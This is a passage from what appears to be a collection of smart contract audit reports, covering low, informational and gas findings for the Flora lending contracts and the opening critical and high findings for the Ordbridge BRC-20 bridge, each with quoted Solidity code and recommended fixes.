the actual balance in the `FeeConverter` contract different from what is accounted for.\r\n\r\nThe lack of specific handling or documentation regarding the support for these special behaviors leads to potential vulnerabilities where the `FeeConverter` contract\'s records might not reflect the actual token balances, causing inconsistencies and potential exploitation avenues.\r\n\r\n**Recommendation:** Check the balance before and after the transfer and use the difference between the two as the actual transferred value.\r\n\r\n\r\n### [L-2] Unbounded `callIncentive` can cause DoS\r\n\r\n**Context:** [FeeConverter.sol](https://github.com/floraDeployer/flora/blob/03a29c339bc2dacf5572b4aa5c4509176755209d/contracts/FeeConverter.sol#L91-L93)\r\n\r\n**Impact:** The absence of an upper bound on the `callIncentive` value allows it to be set to more than 100e18, leading to a potential transaction revert in the `floraInput` function.\r\n\r\n**Description:** In the given code, the `callIncentive` is used in the calculation of the `input` variable within the `floraInput` function. The `callIncentive` is subtracted from 100e18, and if it\'s set to a value greater than 100e18, the subtraction will result in a negative value. This negative value will then cause the calculation to revert.\r\n\r\nThe problematic code is shown below:\r\n\r\n```solidity\r\nuint256 input = (((_fromAmount * priceFrom) / priceTo) *\r\n            (100e18 - callIncentive)) / 100e18;\r\n\r\n```\r\n\r\nAnd the function to set the `callIncentive` value is as follows:\r\n\r\n```solidity\r\nfunction setCallIncentive(uint256 _value) external onlyOwner {\r\n    callIncentive = _value;\r\n}\r\n```\r\n\r\nThere is no constraint on the value of `_value`, allowing the owner to set `callIncentive` to any value, which can lead to the above-mentioned issue.\r\n\r\n**Recommendation:** To mitigate this vulnerability, it is advised to add an upper bound check to ensure that the callIncentive cannot be set to a value greater than 100e18. This can be done by adding a requirement in the setCallIncentive function, as shown below:\r\n\r\n```solidity\r\nfunction setCallIncentive(uint256 _value) external onlyOwner {\r\n    require(_value <= 100e18, "Call incentive must be <= 100e18");\r\n    callIncentive = _value;\r\n}\r\n```\r\n\r\n\r\n## Informational\r\n\r\n\r\n### [I-01] Unsafe Assumptions About Average Time Between Blocks\r\n\r\n**Context:** [LendingPair.sol](https://github.com/floraDeployer/flora/blob/03a29c339bc2dacf5572b4aa5c4509176755209d/contracts/LendingPair.sol#L112-L115)\r\n\r\n**Description**\r\n\r\nUsing blocks rather than seconds to measure time is highly sensitive to changes in the average time between Ethereum blocks.\r\n\r\nSource: [Compound\'s audit from OZ](https://blog.openzeppelin.com/compound-audit#:~:text=Unsafe%20Assumptions%20About%20Average%20Time%20Between%20Blocks)\r\n\r\n```solidity\r\n        lastBlockAccrued[tokenA] = block.number;\r\n        lastBlockAccrued[tokenB] = block.number;\r\n\r\n```\r\n\r\n\r\n\r\n\r\n\r\n\r\n### [I-02] For readability, add commented parameter names (`Type Location /* name */`)\r\n\r\n**Context:**   [CircuitBreaker.sol](https://github.com/floraDeployer/flora/blob/03a29c339bc2dacf5572b4aa5c4509176755209d/contracts/CircuitBreaker.sol),  [FeeConverter.sol](https://github.com/floraDeployer/flora/blob/03a29c339bc2dacf5572b4aa5c4509176755209d/contracts/FeeConverter.sol), [LPTokenMaster.sol](https://github.com/floraDeployer/flora/blob/03a29c339bc2dacf5572b4aa5c4509176755209d/contracts/LPTokenMaster.sol), [LendingController.sol](https://github.com/floraDeployer/flora/blob/03a29c339bc2dacf5572b4aa5c4509176755209d/contracts/LendingController.sol)\r\n\r\n**Description**\r\n\r\nWhen the return statement is documented but unnamed, consider adding a little comment with the name as such: `Type Location /* name */`.\r\n\r\nAs an example:\r\n\r\n```diff\r\n-  ) public view returns (string memory) {\r\n+  ) public view returns (string memory /* Giving a Name Here to Explain the Intent of the Returned Value */) {\r\n```\r\n\r\n\r\n\r\n### [I-03] Non-standard documentation\r\n\r\n**Context:** [CircuitBreaker.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/CircuitBreaker.sol#L14), [FeeConverter.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/FeeConverter.sol#L19-L21), [FeeRecipient.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/FeeRecipient.sol#L14-L15), [LPTokenMaster.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/LPTokenMaster.sol#L18-L21)\r\n\r\n\r\n**Description**\r\n\r\nDocumentation should be between `/** */`:\r\n\r\n```solidity\r\n /**\r\n  * @notice Standard documentation format\r\n  */\r\n```\r\n\r\nHowever, this is not the case in the following instances:\r\n\r\n```solidity\r\n/// @dev check this contract ->\r\n```\r\n\r\n\r\n\r\n### [I-04] Duplicated `require()`/`revert()` Checks should be refactored to a modifier or function\r\n\r\n**Context:** [LendingController.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/LendingController.sol#L135), [TransferHelper.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/TransferHelper.sol#L24-L47), [UnifiedOracleAggregator.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/UnifiedOracleAggregator.sol#L43)\r\n\r\n\r\n**Description**\r\n\r\n```solidity\r\nTransferHelper.sol:24:         require(_amount > 0, "TransferHelper: amount must be > 0");\r\n\r\nTransferHelper.sol:33:         require(_amount > 0, "TransferHelper: amount must be > 0");\r\n\r\nTransferHelper.sol:38:         require(_amount > 0, "TransferHelper: amount must be > 0");\r\n\r\n```\r\n\r\n\r\n\r\n\r\n### [I-05] Event is never emitted\r\n\r\n**Context:** [LendingController.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/LendingController.sol#L66-L67)\r\n\r\n\r\n**Description**\r\n\r\nThe following are defined but never emitted. They can be removed to make the code cleaner.\r\n\r\n```solidity\r\n    event DepositsEnabled(bool value);\r\n    event BorrowingEnabled(bool value);\r\n```\r\n\r\n\r\n\r\n\r\n### [I-06] Events that mark critical parameter changes should contain both the old and the new value\r\n\r\n**Context:** [UnifiedOracleAggregator.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/UnifiedOracleAggregator.sol#L58-L88),\r\n[LendingPair.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/LendingPair.sol#L305-L345),\r\n[LendingController.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/LendingController.sol#L130-L298)\r\n\r\n\r\n**Description**\r\n\r\n\r\nThis should especially be done if the new value is not required to be different from the old value.\r\n\r\n```solidity\r\nfunction setOracle(\r\n        address _token,\r\n        AggregatorV3Interface _linkOracle\r\n    ) external onlyOwner {\r\n        require(\r\n            _token != address(0),\r\n            "UnifiedOracleAggregator: Invalid token address"\r\n        );\r\n\r\n        if (address(_linkOracle) != address(0)) {\r\n            (\r\n                uint80 roundID,\r\n                ,\r\n                ,\r\n                uint256 updatedAt,\r\n                uint80 answeredInRound\r\n            ) = _linkOracle.latestRoundData();\r\n\r\n            require(\r\n                answeredInRound >= roundID,\r\n                "UnifiedOracleAggregator: Oracle is not alive"\r\n            );\r\n            require(\r\n                updatedAt != 0,\r\n                "UnifiedOracleAggregator: Oracle not found"\r\n            );\r\n        }\r\n\r\n        linkOracles[_token] = _linkOracle;\r\n        emit OracleSet(_token, address(_linkOracle));\r\n    }\r\n```\r\n\r\n\r\n\r\n\r\n### [I-07] Function ordering does not follow the Solidity style guide\r\n\r\n**Context:** [LPTokenMaster.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/LPTokenMaster.sol), [LendingController.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/LendingController.sol), [LendingPair.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/LendingPair.sol), [UnifiedOracleAggregator.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/UnifiedOracleAggregator.sol)\r\n\r\n\r\n**Description**\r\n\r\nAccording to the [Solidity style guide](https://docs.soliditylang.org/en/v0.8.17/style-guide.html#order-of-functions), functions should be laid out in the following order :`constructor()`, `receive()`, `fallback()`, `external`, `public`, `internal`, `private`, but the cases below do not follow this pattern\r\n\r\n\r\n```solidity\r\nCurrent order:\r\n                     public owner\r\n                     public acceptOwnership\r\n                     public transferOwnership\r\n                     external initialize\r\n                     external transfer\r\n                     external approve\r\n                     external transferFrom\r\n                     external lendingPair\r\n                     external balanceOf\r\n                     external totalSupply\r\n                     internal _transfer\r\n                     internal _approve\r\n\r\n                     Suggested order:\r\n                     external initialize\r\n                     external transfer\r\n                     external approve\r\n                     external transferFrom\r\n                     external lendingPair\r\n                     external balanceOf\r\n                     external totalSupply\r\n                     public owner\r\n                     public acceptOwnership\r\n                     public transferOwnership\r\n                     internal _transfer\r\n                     internal _approve\r\n```\r\n\r\n\r\n\r\n### [I-08] Lack of checks in setters\r\n\r\n**Context:** [FeeRecipient.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/FeeRecipient.sol#L42-L44), [LendingController.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/LendingController.sol#L267-L307), [FeeConverter.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/FeeConverter.sol#L78-L92)\r\n\r\n\r\n**Description**\r\n\r\nBe it sanity checks (like checks against `0`-values) or initial setting checks: it\'s best for Setter functions to have them\r\n\r\n```solidity\r\n    function setFeeConverter(address _feeConverter) external onlyOwner {\r\n        feeConverter = _feeConverter;\r\n    }\r\n```\r\n\r\n\r\n### [I-09] Missing Event for critical parameters change\r\n\r\n**Context:** [FeeConverter.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/FeeConverter.sol#L78-L92), [FeeRecipient.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/FeeRecipient.sol#L41-L44), [LendingController.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/LendingController.sol#L303-L307)\r\n\r\n**Description**\r\n\r\nEvents help non-contract tools to track changes, and events prevent users from being surprised by changes.\r\n\r\n\r\n```solidity\r\n function setStakingRewards(address _value) external onlyOwner {\r\n        stakingPool = _value;\r\n    }\r\n\r\n    function setTreasury(address _value) external onlyOwner {\r\n        treasury = _value;\r\n    }\r\n\r\n    function setDaoShareWETH(uint256 _value) external onlyOwner {\r\n        daoShareWETH = _value;\r\n    }\r\n\r\n    function setCallIncentive(uint256 _value) external onlyOwner {\r\n        callIncentive = _value;\r\n    }\r\n```\r\n\r\n\r\n### [I-10] NatSpec is completely non-existent on functions that should have them\r\n\r\n**Context:** [CircuitBreaker.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/CircuitBreaker.sol#L38-L68),[FeeConverter.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/FeeConverter.sol#L59-L92),[LPTokenMaster.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/LPTokenMaster.sol#L46-L54)\r\n\r\n\r\n**Description**\r\n\r\nPublic and external functions that aren\'t view or pure should have NatSpec comments.\r\n\r\n\r\n```solidity\r\nfunction pause(address _pair) external onlyGuardian {\r\n        ILendingPair pair = ILendingPair(_pair);\r\n\r\n        address tokenAddressA = pair.tokenA();\r\n        address tokenAddressB = pair.tokenB();\r\n\r\n        int256 sumA = pairBalance(_pair, tokenAddressA);\r\n        int256 sumB = pairBalance(_pair, tokenAddressB);\r\n\r\n        require(\r\n            sumA < 0 || sumB < 0,\r\n            "CircuitBreaker: pause conditions not met"\r\n        );\r\n\r\n        IUpgradeableBeacon(upgradableBeacon).upgradeTo(lendingPairPaused);\r\n\r\n        emit Shutdown();\r\n    }\r\n\r\n    function allowGuardian(address _guardian, bool _value) external onlyOwner {\r\n        isGuardian[_guardian] = _value;\r\n        emit AllowGuardian(_guardian, _value);\r\n    }\r\n\r\n    function completeOwnershipTransfer() external onlyOwner {\r\n        Ownable2Step(upgradableBeacon).acceptOwnership();\r\n    }\r\n\r\n    function returnOwnership() external onlyOwner {\r\n        Ownable2Step(upgradableBeacon).transferOwnership(owner());\r\n    }\r\n```\r\n\r\n\r\n\r\n\r\n### [I-11] Incomplete NatSpec: `@param` is missing on actually documented functions\r\n\r\n**Context:** [LPTokenMaster.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/LPTokenMaster.sol#L56-L65), [LendingPair.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/LendingPair.sol#L98-L345)\r\n\r\n**Description**\r\n\r\nThe following functions are missing `@param` NatSpec comments.\r\n\r\n```solidity\r\n/// @notice initialize called by pairFactory\r\n    function initialize(\r\n        address _underlying,\r\n        address _lendingController\r\n    ) external override {\r\n        require(initialized != true, "LPToken: already intialized");\r\n        underlying = _underlying;\r\n        lendingController = _lendingController;\r\n        initialized = true;\r\n    }\r\n```\r\n\r\n\r\n### [I-12] Consider using named mappings\r\n\r\n**Context:** [CircuitBreaker.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/CircuitBreaker.sol#L19), [LPTokenMaster.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/LPTokenMaster.sol#L23), [LendingController.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/LendingController.sol#L39-L50), [LendingPair.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/LendingPair.sol#L53-L74)\r\n\r\n\r\n**Description**\r\n\r\nUsing [named mappings](https://ethereum.stackexchange.com/questions/51629/how-to-name-the-arguments-in-mapping/145555#145555) will make it easier to understand the purpose of each mapping\r\n\r\n![image](https://github.com/floraDeployer/audit-template/assets/122114333/ff2913aa-0c47-4a17-9794-8e5829583b14)\r\n\r\n\r\n```solidity\r\n    mapping(address => bool) public isGuardian;\r\n```\r\n\r\n\r\n\r\n### [I-13] `require()`\xa0/\xa0`revert()`\xa0statements should have descriptive reason strings\r\n\r\n**Context:** [LendingPair.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/LendingPair.sol#L318)\r\n\r\n**Description**\r\n\r\n\r\n```solidity\r\n        require(_lpRate <= 100e18);\r\n```\r\n\r\n\r\n### [I-14] TODO Left in the code\r\n\r\n**Context:** [LendingPair.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/LendingPair.sol#L137)\r\n\r\n**Description**\r\n\r\nTODOs may signal that a feature is missing or not ready for audit, consider resolving the issue and removing the TODO comment.\r\n\r\n```solidity\r\n        irm.targetUtilization = 90e18; // Must be < 100e18; @todo could also use uint16: 90\r\n```\r\n\r\n\r\n\r\n### [I-15] Use Underscores for Number Literals (add an underscore every 3 digits)\r\n\r\n**Context:** [LendingController.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/LendingController.sol#L27), [LendingPair.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/LendingPair.sol#L135-L136), [UnifiedOracleAggregator.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/UnifiedOracleAggregator.sol#L191)\r\n\r\n**Description**\r\n\r\n```solidity\r\n    uint16 public minObservationCardinalityNext = 1800;\r\n```\r\n\r\n\r\n\r\n\r\n### [I-16] Internal and private variables and functions names should begin with an underscore\r\n\r\n**Context:** [CircuitBreaker.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/CircuitBreaker.sol#L16-L17), [LendingPair.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/LendingPair.sol), [LPTokenMaster.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/LPTokenMaster.sol#L30-L31), [BytesLib.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/external/BytesLib.sol)\r\n\r\n**Description**\r\n\r\nAccording to the Solidity Style Guide, Non-`external` variable and function names should begin with an [underscore](https://docs.soliditylang.org/en/latest/style-guide.html#underscore-prefix-for-non-external-functions-and-variables)\r\n\r\n```solidity\r\n    address private upgradableBeacon;\r\n    address private lendingPairPaused;\r\n```\r\n\r\n\r\n\r\n\r\n### [I-17] Usage of floating `pragma` is not recommended\r\n\r\n**Description**\r\n\r\nIt is considered best practice to pick one compiler version and stick with it. With a floating pragma, contracts may accidentally be deployed using an outdated or problematic compiler version which can cause bugs, putting your smart contract\'s security in jeopardy.\r\n\r\n## Gas Optimization\r\n\r\n\r\n### [G-1] `a = a + b` is more gas effective than `a += b` for state variables (excluding arrays and mappings)\r\n\r\n**Context:** [LendingPair.sol](https://github.com/floraDeployer/flora/blob/03a29c339bc2dacf5572b4aa5c4509176755209d/contracts/LendingPair.sol)\r\n\r\n**Description**\r\n\r\nThis saves **16 gas per instance.**\r\n\r\n```solidity\r\n    function _burnDebtShares(\r\n        address _token,\r\n        address _account,\r\n        uint256 _shares\r\n    ) internal returns (uint256 amount) {\r\n        if (_shares > 0) {\r\n            // Fix rounding error which can make issues during depositRepay / withdrawBorrow\r\n            if (accounting[_token].debtSharesOf[_account] - _shares == 1) {\r\n                _shares += 1;\r\n            }\r\n```\r\n\r\n\r\n\r\n### [G-2] Use assembly to check for `address(0)\r\n\r\n**Context:** [LPTokenMaster.sol](https://github.com/floraDeployer/flora/blob/03a29c339bc2dacf5572b4aa5c4509176755209d/contracts/LPTokenMaster.sol#L136-L140)\r\n\r\n**Description**\r\n\r\n\r\n```solidity\r\n       require(_sender != address(0), "ERC20: transfer from the zero address");\r\n        require(\r\n            _recipient != address(0),\r\n            "ERC20: transfer to the zero address"\r\n        );\r\n```\r\n\r\n\r\n### [G-3] Use Custom Errors instead of Revert Strings to save Gas\r\n\r\n**Context:** [FeeConverter.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/FeeConverter.sol#L66),[LPTokenMaster.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/LPTokenMaster.sol#L61-L158),[LendingPair.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/LendingPair.sol#L106-L317),[PairFactory.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/PairFactory.sol#L112-L135),[TransferHelper.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/TransferHelper.sol#L24-L47),[UnifiedOracleAggregator.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/UnifiedOracleAggregator.sol#L47)\r\n\r\n**Description**\r\n\r\nCustom errors are available from solidity version 0.8.4. Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they\'re hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas\r\n\r\nAdditionally, custom errors can be used inside and outside of contracts (including interfaces and libraries).\r\n\r\nSource: <https://blog.soliditylang.org/2021/04/21/custom-errors/>\r\n\r\nConsider replacing **all revert strings** with custom errors in the solution, and particularly those that have multiple occurrences:\r\n\r\n\r\n```solidity\r\n    require(_amount > 0, "FeeConverter: _amount > 0");\r\n```\r\n\r\n\r\n### [G-4] State variables only set in the constructor should be declared `immutable`\r\n\r\n**Context:** [CircuitBreaker.sol](https://github.com/floraDeployer/flora/blob/cb67b90c3d7c334504deae11072a03f463460882/contracts/CircuitBreaker.sol#L33-L34)\r\n\r\n**Description**\r\n\r\nVariables only set in the constructor and never edited afterwards should be marked as immutable, as it would avoid the expensive storage-writing operation in the constructor (around **20 000 gas** per variable) and replace the expensive storage-reading operations (around **2100 gas** per reading) to a less expensive value reading (**3 gas**)\r\n\r\n```solidity\r\n        upgradableBeacon = _upgradableBeacon;\r\n        lendingPairPaused = _lendingPairPaused;\r\n```\r\n\r\n',pdfLink:"https://github.com/bytes032/reports/blob/main/Flora.pdf"},{title:"Ordbridge",slug:"ordbridge",description:"Bridge between BRC-20 & ERC-20. A gateway to Liquidity for BRC-20 tokens!",findings:6,createdAt:"2023-06-07T03:52:32.356Z",body:'---\r\n\r\n# Findings\r\n\r\n## Critical Risk\r\n\r\n### [C-1] Users money will be lost forever if they dont use an taproot address\r\n\r\n**Context:** [TokenFactory.sol](https://github.com/lowkeycoders/bridgecontract/blob/28238baaf1e2139cd16ee0c0b2a0dd33a2aa3fdf/contracts/TokenFactory.sol#L195-L214)\r\n\r\n**Impact:** The current implementation of the `burnERCTokenForBRC` function allows users to provide any BTC address for receiving BRC tokens. However, BRC tokens are only compatible with ordinal taproot addresses (P2TR). If a user provides a valid BTC address that is not an ordinal compatible taproot address, their funds will be permanently lost. This vulnerability poses a risk of financial loss for users.\r\n\r\n**Description:** The `burnERCTokenForBRC` function is used to swap ERC\'s for BRC\'s. The user has to provide a ticker (ordinal identifier), amount, btcAddress and meta.\r\n\r\nOnce a swap is "initiated", there\'s no way for the user to cancel it or change the receiver address.\r\n\r\n```solidity\r\n    function burnERCTokenForBRC(\r\n        string calldata ticker,\r\n        uint256 amount,\r\n        string calldata btcAddress,\r\n        string calldata meta\r\n    ) external payable nonReentrant whenNotPaused {\r\n\r\n        string memory uppercaseTicker = uppercase(ticker);\r\n        require(msg.value == BURN_ETH_FEE, "Incorrect fee");\r\n        // solhint-disable-next-line\r\n        feeRecipient.call{ value: BURN_ETH_FEE }("");\r\n        require(tokenContracts[uppercaseTicker] != address(0), "Invalid ticker");\r\n\r\n        ZUTToken(tokenContracts[uppercaseTicker]).burnFrom(msg.sender, amount);\r\n\r\n        uint256 id = burnForBRCEntries.length;\r\n        burnForBRCEntries.push(BurnForBRCEntry(id, uppercaseTicker, msg.sender, amount, btcAddress, meta, false));\r\n\r\n        emit BurnForBRCEntryAdded(uppercaseTicker, msg.sender, btcAddress, id, amount, meta);\r\n    }\r\n```\r\n\r\nIf we refer to BRC\'s docs, it clearly states:\r\n\r\n> Do not send inscriptions to non ordinal compatible wallet taproot addresses\r\n\r\nThe vulnerability here stems from the fact that the user can set any kind of BTC address (P2PKH, P2SH, P2WPKH) while BRC\'s as of right now work only with P2TR.\r\n\r\nAs a consequence, if the user uses a valid. BTC address, but not an ordinal compatible taproot one, his funds will be forever lost.\r\n\r\n**Recommendation:** To address this vulnerability, it is recommended to implement a validation step to ensure that the btcAddress provided by the user is an ordinal compatible taproot address (P2TR).\r\n\r\nThe following steps can be taken as a recommendation:\r\n\r\n1. Before proceeding with the burn transaction, validate the btcAddress format.\r\n2. Check that the btcAddress starts with "bc1p", which is the prefix for P2TR addresses.\r\n3. If the btcAddress does not meet the required format, reject the transaction and provide an error message to the user, instructing them to use an ordinal compatible taproot address (P2TR).\r\n\r\n```solidity\r\nfunction isOrdinalTaprootAddress(string memory btcAddress) internal pure returns (bool) {\r\n    // Check that the btcAddress starts with "bc1p" (P2TR address prefix)\r\n    bytes memory addressBytes = bytes(btcAddress);\r\n    bytes memory prefixBytes = bytes("bc1p");\r\n\r\n    for (uint i = 0; i < prefixBytes.length; i++) {\r\n        if (addressBytes[i] != prefixBytes[i]) {\r\n            return false;\r\n        }\r\n    }\r\n    return true;\r\n}\r\n\r\nfunction burnERCTokenForBRC(\r\n    string calldata ticker,\r\n    uint256 amount,\r\n    string calldata btcAddress,\r\n    string calldata meta\r\n) external payable nonReentrant whenNotPaused {\r\n    // Validate that the btcAddress is an ordinal compatible taproot address (P2TR)\r\n    require(isOrdinalTaprootAddress(btcAddress), "Invalid BTC address format");\r\n    // Rest of the function implementation...\r\n}\r\n\r\n```\r\n\r\n### [C-2] Oversupply vulnerability due to lack of maximum limit enforcement in ZUTToken contract\r\n\r\n**Context:** [ZUTToken.sol](https://github.com/lowkeycoders/bridgecontract/blob/28238baaf1e2139cd16ee0c0b2a0dd33a2aa3fdf/contracts/ZUTToken.sol#L13-L30)\r\n\r\n**Impact:** The current implementation of the ZUTToken contract allows minting an type(uint256).max amount of ZUTTokens, which can result in exceeding the maximum supply specified by the BRC documentation. This vulnerability poses a risk of generating ZUTTokens that cannot be converted to ordinals.\r\n\r\n**Description:** When users "bridge" a ordinal, they are going to receive a ZUTToken in exchange.\r\n\r\n```solidity\r\ncontract ZUTToken is Ownable, ERC20 {\r\n    using Strings for string;\r\n\r\n    constructor(string memory name) ERC20(concat("Wrapped-", name), concat("w", name)) {}\r\n\r\n    function concat(string memory a, string memory b) internal pure returns (string memory) {\r\n        return string(abi.encodePacked(a, b));\r\n    }\r\n\r\n    function mintTo(address to, uint256 amount) external onlyOwner {\r\n        _mint(to, amount);\r\n    }\r\n\r\n    function burnFrom(address to, uint256 amount) external onlyOwner {\r\n        _burn(to, amount);\r\n    }\r\n}\r\n\r\n```\r\n\r\nThe "allowance" is given by creating an ERC entry,\r\n\r\n```solidity\r\n function addMintERCEntries(\r\n        string[] calldata requestedBRCTickers,\r\n        uint256[] calldata amounts,\r\n        address[] calldata users,\r\n        string[] calldata btcTxIds\r\n    ) external onlyOwner {\r\n```\r\n\r\nAnd then the BRC -> ERC20 bridge happens here by minting ZUTTokens.\r\n\r\n```solidity\r\n        ZUTToken(tokenContracts[uppercaseTicker]).mintTo(feeRecipient, feeTokenAmount);\r\n        ZUTToken(tokenContracts[uppercaseTicker]).mintTo(msg.sender, userTokenAmount);\r\n```\r\n\r\nHowever, the ZUTToken contract does not implement a maximum supply check, thus allowing for an arbitrary amount of tokens to be minted by the contract owner. This is a critical issue because the equivalent BRC token has a [documented maximum supply limit](https://domo-2.gitbook.io/brc-20-experiment/) that cannot exceed `uint64_max`.\r\n\r\nIn the absence of a maximum supply enforcement in the `mintTo` function of the ZUTToken contract, an excess of ZUTTokens can be created. This oversupply is irreparable as the excess tokens can never be bridged back to the equivalent BRC token due to its supply limit.\r\n\r\nAdditionally, the `addMintERCEntries` function lacks checks to ensure the `amounts` array provided respects the maximum supply limit, allowing a potentially harmful oversupply when minting the ZUTTokens.\r\n\r\nThe bridge function that triggers the minting of ZUTTokens doesn\'t enforce any checks to prevent an oversupply, leading to an uncontrolled creation of tokens beyond the maximum supply limit of the equivalent BRC token.\r\n\r\n**Recommendation:** Enforce a maximum supply limit in the ZUTToken contract to match the `uint64_max` limit of the equivalent BRC token. This could be achieved by introducing a state variable to keep track of the total supply of ZUTTokens.\r\n\r\nModify the `mintTo` function to check if the minting of new tokens would exceed the maximum supply limit. If it would, the function should revert the transaction.\r\n\r\nApply similar checks in the `addMintERCEntries` function and the bridge function to prevent minting of tokens beyond the maximum limit.\r\n\r\nFor example:\r\n\r\n```solidity\r\n    uint256 public maxSupply;\r\n\r\n    constructor(string memory name) ERC20(concat("Wrapped-", name), concat("w", name)) {\r\n        // Set the max supply to the maximum uint64 value.\r\n        maxSupply = 2**64 - 1;\r\n    }\r\n\r\n  function mintTo(address to, uint256 amount) external onlyOwner {\r\n        require(totalSupply().add(amount) <= maxSupply, "Cannot exceed maximum supply");\r\n        _mint(to, amount);\r\n    }\r\n```\r\n\r\n## High Risk\r\n\r\n### [H-1] Decimal precision mismatch in ZUToken creation and burning may result in incorrect token exchange ratios\r\n\r\n**Context:** [TokenFactory.sol](https://github.com/lowkeycoders/bridgecontract/blob/28238baaf1e2139cd16ee0c0b2a0dd33a2aa3fdf/contracts/TokenFactory.sol#L170-L190)\r\n\r\n**Impact:** The vulnerability in the code allows for a decimal precision mismatch between the ZToken (ERC) created and the BRC token being swapped. This mismatch can lead to incorrect token exchange ratios and potential financial gain or loss for users.\r\n\r\n**Description:** The claimERCEntryForWallet function is used by users who want to claim the ERC they have been given in exchange for the BRC they have swapped.\r\n\r\n```solidity\r\n    function claimERCEntryForWallet(string memory ticker) external whenNotPaused nonReentrant {\r\n\r\n        string memory uppercaseTicker = uppercase(ticker);\r\n        require(mintableERCTokens[uppercaseTicker][msg.sender] > 0, "No entry");\r\n        if (tokenContracts[uppercaseTicker] == address(0)) {\r\n\r\n            ZUTToken token = new ZUTToken(uppercaseTicker);\r\n            tokenContracts[uppercaseTicker] = address(token);\r\n            emit ERCTokenContractCreated(uppercaseTicker, address(token));\r\n        }\r\n        //TODO check value\r\n        uint256 feeTokenAmount = (mintableERCTokens[uppercaseTicker][msg.sender] * TOKEN_FEE_PERCENT) / 100;\r\n        // @audit fee could be 0\r\n\r\n        uint256 userTokenAmount = mintableERCTokens[uppercaseTicker][msg.sender] - feeTokenAmount;\r\n\r\n        ZUTToken(tokenContracts[uppercaseTicker]).mintTo(feeRecipient, feeTokenAmount);\r\n        ZUTToken(tokenContracts[uppercaseTicker]).mintTo(msg.sender, userTokenAmount);\r\n\r\n        emit MintableERCEntryClaimed(uppercaseTicker, msg.sender, mintableERCTokens[uppercaseTicker][msg.sender], userTokenAmount, feeTokenAmount);\r\n\r\n        delete mintableERCTokens[uppercaseTicker][msg.sender];\r\n    }\r\n```\r\n\r\nThe following check `if (tokenContracts[uppercaseTicker] == address(0)) {` is used to check if there\'s an already associated "ZUTToken" with the afforemented BRC ticker. The ticker is the 4 letter identifier of the brc-20.\r\n\r\nThen, if there\'s no "ERC" token for that BRC, it proceeds by creating a new token. The 